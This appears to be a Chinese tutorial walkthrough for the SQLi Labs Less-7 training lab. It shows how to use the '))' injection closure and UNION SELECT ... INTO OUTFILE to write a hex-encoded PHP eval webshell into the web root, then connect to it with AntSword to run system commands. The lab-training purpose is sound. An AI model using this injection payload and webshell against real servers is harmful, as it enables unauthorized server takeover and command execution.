# SQLi Labs Less-7 文件写入注入复现：从原理到实践

### SQLi Labs Less-7 文件读写注入复现步骤 🛠️

Less-7 的核心是利用 **`INTO OUTFILE`** 写入一句话木马，从而获取服务器控制权。以下是完整复现流程：

---

#### 一、前置条件检查 ✅

在开始前，必须确保靶场满足以下条件，否则写入操作会失败：

1. **MySQL 配置**：`secure_file_priv` 必须为空（允许任意目录读写）。

    - Windows：修改 `my.ini`，在 `[mysqld]` 下添加 `secure_file_priv=""`。

    - Linux (Debian)：修改 `/etc/mysql/mariadb.conf.d/50-server.cnf`，添加 `secure_file_priv=""`，然后重启服务 `systemctl restart mariadb`。

2. **PHP 配置**：`magic_quotes_gpc = Off`（PHP 7+ 已移除该选项，无需额外设置）。

3. **权限**：登录的 MySQL 用户（如 `root`）必须拥有文件写入权限。

4. **路径**：明确服务器 Web 目录的**绝对路径**（如 `/var/www/html/sqli-labs/Less-7/`）。

---

#### 二、判断注入点闭合方式 🔍

Less-7 的 SQL 语句为 `$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";`，因此闭合方式为 **`'))`**。

- 测试：访问 `?id=1'))`，若页面正常显示 `You are in.... Use outfile......`，则闭合方式正确。

---

#### 三、构造写入一句话木马 Payload 📝

1. **一句话木马**：`<?php @eval($_POST['cmd']); ?>`

2. **转十六进制**：`0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e`（避免单引号转义问题）

3. **绝对路径**：根据你的靶场环境替换，例如：

    - Linux (Debian)：`/var/www/html/sqli-labs/Less-7/shell.php`

    - Windows：`C:\\phpstudy\\WWW\\sqli-labs\\Less-7\\shell.php`（双反斜杠转义）

4. **完整 Payload**：

    ```Plain Text
    
    ?id=-1')) union select 1,2,0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e into outfile '/var/www/html/sqli-labs/Less-7/shell.php'--+
    ```

    - 解释：`-1` 使原查询失效，`union select` 构造新查询，`into outfile` 将查询结果（木马）写入指定路径。

---

#### 四、验证写入并连接蚁剑 🐜

1. **验证文件**：访问 `http://localhost/sqli-labs/Less-7/shell.php`，若页面空白（无报错），说明木马写入成功。

2. **蚁剑连接**：

    - 打开中国蚁剑，右键添加数据。

    - **URL 地址**：`http://localhost/sqli-labs/Less-7/shell.php`

    - **连接密码**：`cmd`

    - **编码设置**：`UTF8`

    - **连接类型**：`PHP`

    - 点击“测试连接”，成功后即可执行系统命令、管理文件。

---

#### 五、常见问题排查 ❌

- **写入失败**：检查 `secure_file_priv` 配置、绝对路径是否正确、MySQL 用户权限是否足够。

- **页面报错**：确认闭合方式为 `'))`，Payload 中的单引号和括号是否正确转义。

- **蚁剑连接失败**：检查木马文件是否存在、路径是否可访问、PHP 解析是否正常。

---

### 最终效果 🎯

成功写入木马后，你将获得服务器的控制权，可以执行任意系统命令，完成 Less-7 的通关。

---


> （注：文档部分内容可能由 AI 生成）
